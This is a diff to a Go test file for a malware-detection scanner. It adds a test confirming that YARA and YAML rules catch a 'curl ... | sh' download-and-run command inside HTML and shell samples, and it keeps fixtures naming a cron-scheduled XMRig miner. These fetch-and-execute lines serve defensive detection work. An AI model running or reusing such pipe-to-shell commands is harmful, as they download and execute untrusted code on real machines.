@@ -251,9 +251,6 @@ func TestRuleScanBudgetDownloadAndMinerLines(t *testing.T) {
 			"invalid_cron_prefixes.txt": []byte(strings.Repeat("*/5 * * * * "+strings.Repeat("\xed\xa0\x80", 86)+"XMRig ", 2_000)),
 		}},
 		{"dropper_wget_exec", map[string][]byte{
-			"static_markup.html":    []byte("<html>" + strings.Repeat("<!<", 200_000) + "</html>"),
-			"script_openers.html":   []byte("<html>" + strings.Repeat("<script ", 75_000)),
-			"script_spaces.html":    []byte("<html><script " + strings.Repeat(" ", 600_000) + "language=php>"),
 			"download_words.txt":    downloadWords,
 			"download_args.txt":     downloadArgs,
 			"pipe_targets.txt":      []byte(strings.Repeat("curl x | sh ", 50_000)),
@@ -282,6 +279,35 @@ func TestRuleScanBudgetDownloadAndMinerLines(t *testing.T) {
 			requireRuleScanBudget(t, tc.rule, tc.inputs)
 		})
 	}
+}
+
+// Keep commands in the HTML samples so the budget exercises detection as well
+// as scanning. Leading markup must not turn a fast scan into a clean verdict.
+func TestRuleScanBudgetHTMLDownloads(t *testing.T) {
+	const command = "curl https://example.test/p | sh\n"
+	inputs := map[string][]byte{
+		"markup_header.sh": []byte("<html x\n" + strings.Repeat(command, 20_000)),
+		"commands_in_html.html": []byte("<!DOCTYPE html>\n<html>\n" +
+			strings.Repeat("<code>"+command+"</code>\n", 15_000) + "</html>"),
+		"long_markup_prefix.html": []byte("<html>" + strings.Repeat("<p>text</p>", 60_000) +
+			"<code>" + command + "</code></html>"),
+	}
+	yaraScanner, yamlScanner := loadDownloadRuleScanners(t)
+	for name, content := range inputs {
+		t.Run(name+"/detection", func(t *testing.T) {
+			matches, err := csmyara.ScanBytesChecked(yaraScanner, name, content)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if !hasRepositoryYaraRule(matches, "dropper_wget_exec") {
+				t.Error("YARA did not detect the download command")
+			}
+			if !hasSignatureRule(yamlScanner.ScanContent(content, filepath.Ext(name)), "dropper_wget_exec") {
+				t.Error("YAML did not detect the download command")
+			}
+		})
+	}
+	requireRuleScanBudget(t, "dropper_wget_exec", inputs)
 }
 
 // The archive loader rule chains a password call, a member read and an
